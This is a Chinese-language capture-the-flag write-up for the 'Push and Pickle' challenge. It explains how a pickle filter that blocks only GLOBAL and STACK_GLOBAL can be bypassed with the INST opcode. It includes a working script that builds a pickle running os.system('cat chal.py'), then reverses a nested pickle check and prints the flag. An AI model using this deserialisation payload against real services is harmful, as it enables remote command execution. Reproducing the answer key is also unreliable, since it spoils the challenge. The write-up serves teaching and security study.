# Push and Pickle

## 题目简述

服务读取 Base64 编码的 Python pickle，用 `pickletools.genops` 拒绝 `GLOBAL`（`c`）和 `STACK_GLOBAL`（`0x93`），随后仍直接执行 `pickle.loads`。公开版源码把 `check_flag` 的实现删去，因此解题分为两段：先利用遗漏的 pickle 调用指令读取完整 `chal.py`，再逆向其中嵌套的第二段 pickle 字节码恢复 Flag。

## 解题过程

过滤器只按 opcode 精确匹配两种全局解析指令，却遗漏了旧协议的 `INST`。`INST` 同样会按模块名和对象名解析可调用对象，并把标记栈上的参数传入。因此可把命令字符串压栈，再以 `INST os\nsystem\n` 调用 `os.system`：

```python
import base64
import pickletools
from pwn import p8

op = {item.name: item.code.encode("latin-1") for item in pickletools.opcodes}
command = b"cat chal.py"

payload = op["PROTO"] + p8(4)
payload += op["MARK"]
payload += op["SHORT_BINUNICODE"] + p8(len(command)) + command
payload += op["INST"] + b"os\nsystem\n"
payload += op["STOP"]
print(base64.b64encode(payload).decode())
```

服务在反序列化时先把完整源码打印到标准输出。源码中的 `check_flag` 又反序列化一段自构造 pickle：它保存一个目标 `bytearray`，动态创建 `CodeType` 与 `FunctionType`，再对 `enumerate(target)` 做 `map` 和 `all`。用 `pickletools.dis` 查看栈操作，并把代码对象反汇编后，映射函数的有效约束可整理为：

$$
\text{target}[i]=\bigl(\operatorname{ord}(\text{guess}[i])+2(i+97)\bigr)\bmod203.
$$

其中目标数组可直接从嵌套 pickle 的 `BYTEARRAY8` 参数取得。逆运算无需真的执行不可信 pickle：

```python
target = bytearray(
    b"lbp`sg~S:_p\x7fnf\x81yJ\x8bzP\x92\x95\x8cr\x88\x9d\x90"
    b"\x8c\x7fb\x96\xa0\xa3\x9e\xae^\xa4s\xa5\xa6y}\xc8"
)

flag = "".join(
    chr((value - 2 * (index + 97)) % 203)
    for index, value in enumerate(target)
)
print(flag)
```

输出为：

```text
uiuctf{N3Ver_Und3r_3stiMate_P1ckles!e2ba24}
```

## 方法总结

- `pickle.loads` 本质上允许执行对象构造与调用；只封禁常见的 `GLOBAL + REDUCE` 组合并不能建立安全边界，`INST` 等旧协议指令仍可解析全局对象。
- 利用链应分层验证：先用最小 `os.system` payload 确认源码泄漏，再对内层 pickle 做静态反汇编，避免把两段机制混为一谈。
- 对嵌入 `CodeType` 的 pickle，最终目标是还原每个栈对象和代码对象的数学谓词；本题的逐字节模线性关系一旦明确，就可完全离线求逆。
